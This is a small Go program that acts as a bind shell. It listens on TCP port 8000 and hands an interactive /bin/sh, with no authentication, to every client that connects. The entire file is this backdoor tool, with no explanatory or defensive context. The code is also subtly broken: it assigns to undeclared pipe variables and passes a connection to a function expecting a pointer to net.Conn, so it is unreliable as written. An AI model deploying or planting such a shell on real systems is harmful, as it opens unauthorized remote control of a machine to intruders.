package main

import (
    "os/exec"
    "io"
    "log"
    "net"
)

func handle(conn *net.Conn) {
    rp, wp = io.Pipe()
    cmd := exec.Command("/bin/sh", "-i")
    cmd.Stdin = conn
    cmd.Stderr = wp
    cmd.Stdout = wp
    go io.Copy(conn, rp)
    cmd.Run()
    conn.Close()
}

func main() {
    listener, err := net.Listen("tcp", ":8000")
    if err != nil {
	log.Fatalln(err)
    }
    for {
	conn, err := listener.Accept()
	if err != nil {
	    log.Fatalln(err)
	}
	go handle(conn)
    }
}
